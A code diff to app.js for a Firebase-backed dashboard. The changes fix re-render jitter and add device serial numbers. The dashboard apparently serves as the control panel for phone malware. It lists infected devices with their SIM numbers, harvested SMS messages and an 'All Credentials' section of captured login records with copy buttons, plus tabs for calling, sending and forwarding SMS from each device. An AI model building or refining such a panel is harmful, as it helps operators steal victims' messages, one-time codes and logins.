@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - All JavaScript Logic                                */
+/* app.js - Fixed: No Auto-Refresh Jitter, Serial Numbers      */
 /* ============================================================ */
 
 // ============================================================
@@ -39,6 +39,8 @@ let modalSmsOffset = 0;
 let modalTarget = 'ALL';
 let deviceSmsCache = {};
 let smsFilterDevice = null;
+let deviceSerialMap = {}; // Cache for serial numbers
+let isRendering = false; // Prevent re-render while rendering
 
 // ============================================================
 // DOM REFS
@@ -61,18 +63,30 @@ db.ref(".info/connected").on("value", (snap) => {
 });
 
 // ============================================================
-// MAIN DATA LISTENER - INSTANT LOAD
+// MAIN DATA LISTENER - NO AUTO REFRESH JITTER
 // ============================================================
 let firstLoad = true;
+let lastData = {};
 
 db.ref().on("value", (snapshot) => {
-    cachedData = snapshot.val() || {};
+    const newData = snapshot.val() || {};
+    
+    // Check if data actually changed
+    if (JSON.stringify(newData) === JSON.stringify(lastData)) {
+        return; // No change, skip re-render
+    }
+    
+    cachedData = newData;
+    lastData = JSON.parse(JSON.stringify(newData));
 
     const active = document.activeElement;
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) return;
 
-    renderAll();
+    // Only re-render if not currently rendering
+    if (!isRendering) {
+        renderAll();
+    }
 
     if (firstLoad) {
         firstLoad = false;
@@ -83,33 +97,40 @@ db.ref().on("value", (snapshot) => {
 });
 
 // ============================================================
-// RENDER ALL
+// RENDER ALL - WITH CACHE
 // ============================================================
 function renderAll() {
-    renderDevices();
-    renderAllSms();
-    renderAnalytics();
-    updateBackupDeviceList();
+    if (isRendering) return;
+    isRendering = true;
+    
+    try {
+        renderDevices();
+        renderAllSms();
+        renderAnalytics();
+        updateBackupDeviceList();
 
-    const devices = cachedData.user_data || {};
-    const keys = Object.keys(devices);
-    $('deviceCount').textContent = keys.length;
-    $('panelDeviceCount').textContent = keys.length;
+        const devices = cachedData.user_data || {};
+        const keys = Object.keys(devices);
+        $('deviceCount').textContent = keys.length;
+        $('panelDeviceCount').textContent = keys.length;
 
-    const smsData = cachedData.user_sms || {};
-    let totalSms = 0;
-    Object.keys(smsData).forEach(d => {
-        totalSms += Object.keys(smsData[d]).length;
-    });
-    $('smsCount').textContent = totalSms;
-    $('panelSmsCount').textContent = totalSms;
+        const smsData = cachedData.user_sms || {};
+        let totalSms = 0;
+        Object.keys(smsData).forEach(d => {
+            totalSms += Object.keys(smsData[d]).length;
+        });
+        $('smsCount').textContent = totalSms;
+        $('panelSmsCount').textContent = totalSms;
 
-    if (isPanelOpen.backup) {
-        const selected = $('backupDeviceSelect').value;
-        if (selected) {
-            updateBackupStatusDisplay(selected);
-            loadBackupSmsForDevice(selected);
+        if (isPanelOpen.backup) {
+            const selected = $('backupDeviceSelect').value;
+            if (selected) {
+                updateBackupStatusDisplay(selected);
+                loadBackupSmsForDevice(selected);
+            }
         }
+    } finally {
+        isRendering = false;
     }
 }
 
@@ -171,12 +192,35 @@ function filterDevices(filter) {
 }
 
 // ============================================================
-// RENDER DEVICES - SMOOTH & FAST
+// GET DEVICE SERIAL NUMBER - CACHED
+// ============================================================
+function getDeviceSerial(devId) {
+    if (deviceSerialMap[devId]) return deviceSerialMap[devId];
+    
+    const dev = cachedData.user_data?.[devId];
+    if (dev) {
+        let serial = dev.user_serial || dev.uesr_serial || 0;
+        if (typeof serial === 'string') serial = parseInt(serial) || 0;
+        deviceSerialMap[devId] = serial;
+        return serial;
+    }
+    return 0;
+}
+
+// ============================================================
+// RENDER DEVICES - FIXED: NO JITTER, WITH SERIAL NUMBERS
 // ============================================================
 function renderDevices() {
     const container = $('devicesContainer');
     const devices = cachedData.user_data || {};
     allDeviceKeys = Object.keys(devices);
+
+    // Sort devices by serial number (descending - newest first)
+    allDeviceKeys.sort((a, b) => {
+        const serialA = getDeviceSerial(a);
+        const serialB = getDeviceSerial(b);
+        return serialB - serialA;
+    });
 
     if (currentFilter === 'online') {
         filteredDeviceKeys = allDeviceKeys.filter(id => {
@@ -204,8 +248,10 @@ function renderDevices() {
 
     let html = '';
 
-    displayKeys.forEach((devId) => {
+    displayKeys.forEach((devId, index) => {
         const dev = devices[devId] || {};
+        const serial = getDeviceSerial(devId);
+        const deviceNumber = start + index + 1; // 1, 2, 3, 4...
 
         let online = dev.isOnline || dev.online || false;
         const lastSeen = dev.last_online || dev.timestamp;
@@ -243,11 +289,35 @@ function renderDevices() {
             devLoginList.reverse();
         }
 
+        // All login data in one place
+        let allLoginHtml = '';
+        if (devLoginList.length > 0) {
+            allLoginHtml = devLoginList.map((rec, idx) => {
+                let fields = '';
+                for (let k in rec) {
+                    if (k === 'key' || k === 'timestamp') continue;
+                    fields += `<div class="login-field">
+                        <span class="field-label">${k}:</span>
+                        <span class="field-value" id="field-${devId}-${idx}-${k}">${rec[k]}</span>
+                        <button class="copy-field-btn" onclick="copyField('field-${devId}-${idx}-${k}')"><i class="fas fa-copy"></i></button>
+                    </div>`;
+                }
+                return `<div class="login-card">
+                    <div class="login-card-header">Record ${idx+1}</div>
+                    <div class="login-card-body">${fields}</div>
+                </div>`;
+            }).join('');
+        }
+
         html += `
-            <div class="device-card-luxury ${isExpanded ? 'expanded' : ''}" id="card-${devId}" onclick="toggleDevice('${devId}')">
-                <div class="device-top">
+            <div class="device-card-luxury ${isExpanded ? 'expanded' : ''}" id="card-${devId}">
+                <div class="device-top" onclick="toggleDevice('${devId}')">
                     <div>
-                        <div class="device-name">📱 ${devId}</div>
+                        <div class="device-name">
+                            <span class="device-serial-badge">#${deviceNumber}</span>
+                            📱 ${devId}
+                            ${serial > 0 ? `<span class="device-serial-badge" style="background:rgba(16,185,129,0.12);color:var(--green);border-color:rgba(16,185,129,0.2);">S-${serial}</span>` : ''}
+                        </div>
                         <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">
                             ${isExpanded ? '▲ Click to collapse' : '▼ Click to expand'}
                         </div>
@@ -258,10 +328,11 @@ function renderDevices() {
                     </div>
                 </div>
 
-                <div class="device-info-grid">
+                <div class="device-info-grid" onclick="toggleDevice('${devId}')">
                     <div class="item"><span>Device</span><b>${dev.Device_info || 'N/A'}</b></div>
                     <div class="item"><span>SIM 1</span><b>${dev.numberSim1 || 'N/A'}</b></div>
                     <div class="item"><span>SIM 2</span><b>${dev.numberSim2 || 'N/A'}</b></div>
+                    ${serial > 0 ? `<div class="item"><span>Serial</span><b style="color:var(--gold);">${serial}</b></div>` : ''}
                 </div>
 
                 <div class="device-body">
@@ -291,27 +362,11 @@ function renderDevices() {
                         ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                     </div>
 
-                    <!-- Login Section with Copy Buttons -->
+                    <!-- Login Section - All in One Place -->
                     <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
-                        <h4 style="color:#f59e0b;font-size:13px;">🔑 Credentials</h4>
+                        <h4 style="color:#f59e0b;font-size:13px;">🔑 All Credentials</h4>
                         <div class="login-cards">
-                            ${devLoginList.length === 0 ? '<div class="empty-luxury">No credentials</div>' :
-                            devLoginList.map((rec, idx) => {
-                                let fields = '';
-                                let fieldArray = [];
-                                for (let k in rec) {
-                                    if (k === 'key' || k === 'timestamp') continue;
-                                    fields += `<div class="login-field">
-                                        <span class="field-label">${k}:</span>
-                                        <span class="field-value" id="field-${devId}-${idx}-${k}">${rec[k]}</span>
-                                        <button class="copy-field-btn" onclick="copyField('field-${devId}-${idx}-${k}')"><i class="fas fa-copy"></i></button>
-                                    </div>`;
-                                }
-                                return `<div class="login-card">
-                                    <div class="login-card-header">Record ${idx+1}</div>
-                                    <div class="login-card-body">${fields}</div>
-                                </div>`;
-                            }).join('')}
+                            ${devLoginList.length === 0 ? '<div class="empty-luxury">No credentials found</div>' : allLoginHtml}
                         </div>
                     </div>
 
@@ -400,6 +455,64 @@ function renderDevices() {
             renderDevices();
         };
         container.insertBefore(backBtn, container.firstChild);
+    }
+}
+
+// ============================================================
+// TOGGLE DEVICE - NO FULL RE-RENDER
+// ============================================================
+function toggleDevice(devId) {
+    expandedDevices[devId] = !expandedDevices[devId];
+    
+    // Just toggle class on the card - no re-render
+    const card = document.getElementById(`card-${devId}`);
+    if (card) {
+        card.classList.toggle('expanded');
+        const hint = card.querySelector('.device-top .device-name + div');
+        if (hint) {
+            hint.textContent = expandedDevices[devId] ? '▲ Click to collapse' : '▼ Click to expand';
+        }
+    }
+}
+
+// ============================================================
+// SET TAB - NO FULL RE-RENDER
+// ============================================================
+function setTab(devId, tab) {
+    if (activeTabs[devId] === tab) {
+        activeTabs[devId] = null;
+    } else {
+        activeTabs[devId] = tab;
+        if (tab === 'backup') refreshDeviceBackup(devId);
+    }
+    
+    // Just update the UI without full re-render
+    const card = document.getElementById(`card-${devId}`);
+    if (!card) return;
+
+    // Update button states
+    const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
+    buttons.forEach(btn => {
+        btn.className = btn.className.replace(/active-\w+/g, '').trim();
+    });
+
+    // Update section visibility
+    const sections = card.querySelectorAll('.section-box');
+    sections.forEach(sec => sec.classList.remove('active'));
+
+    const targetTab = activeTabs[devId];
+    if (targetTab) {
+        const activeSec = card.querySelector(`#sec-${targetTab}-${devId}`);
+        if (activeSec) activeSec.classList.add('active');
+
+        buttons.forEach(btn => {
+            if (btn.textContent.trim().includes('💬') && targetTab === 'sms') btn.classList.add('active-sms');
+            else if (btn.textContent.trim().includes('🔑') && targetTab === 'login') btn.classList.add('active-login');
+            else if (btn.textContent.trim().includes('📞') && targetTab === 'call') btn.classList.add('active-call');
+            else if (btn.textContent.trim().includes('✉️') && targetTab === 'sendsms') btn.classList.add('active-sendsms');
+            else if (btn.textContent.trim().includes('🔀') && targetTab === 'fwd') btn.classList.add('active-fwd');
+            else if (btn.textContent.trim().includes('💾') && targetTab === 'backup') btn.classList.add('active-backup');
+        });
     }
 }
 
@@ -514,9 +627,18 @@ function loadMoreAllSms() {
 function loadMoreDeviceSms(devId) {
     if (deviceSmsCache[devId]) {
         deviceSmsCache[devId].offset += SMS_LIMIT;
-        renderDevices();
-        expandedDevices[devId] = true;
-        activeTabs[devId] = 'sms';
+        // Re-render just this device's card
+        const card = document.getElementById(`card-${devId}`);
+        if (card) {
+            // We need to re-render the SMS section only
+            // For simplicity, we'll re-render the whole device section
+            renderDevices();
+            // Re-expand
+            expandedDevices[devId] = true;
+            activeTabs[devId] = 'sms';
+            const cardEl = document.getElementById(`card-${devId}`);
+            if (cardEl) cardEl.classList.add('expanded');
+        }
     }
 }
 
@@ -680,8 +802,8 @@ function updateBackupDeviceList() {
     keys.forEach(id => {
         const dev = devices[id];
         const name = dev.d_name || dev.device_name || id;
-        const serial = dev.user_serial || '';
-        const label = serial ? `#${serial} ${name}` : name;
+        const serial = getDeviceSerial(id);
+        const label = serial > 0 ? `#${serial} ${name}` : name;
         select.innerHTML += `<option value="${id}">${label}</option>`;
     });
     if (current && keys.includes(current)) select.value = current;
@@ -999,25 +1121,6 @@ function renderModalSms() {
 function closeSmsModal(e) {
     if (e && e.target !== e.currentTarget) return;
     $('smsModal').classList.remove('open');
-}
-
-// ============================================================
-// DEVICE UI HELPERS
-// ============================================================
-function toggleDevice(devId) {
-    expandedDevices[devId] = !expandedDevices[devId];
-    renderDevices();
-}
-
-function setTab(devId, tab) {
-    if (activeTabs[devId] === tab) {
-        activeTabs[devId] = null;
-    } else {
-        activeTabs[devId] = tab;
-        if (tab === 'backup') refreshDeviceBackup(devId);
-    }
-    renderDevices();
-    expandedDevices[devId] = true;
 }
 
 // ============================================================
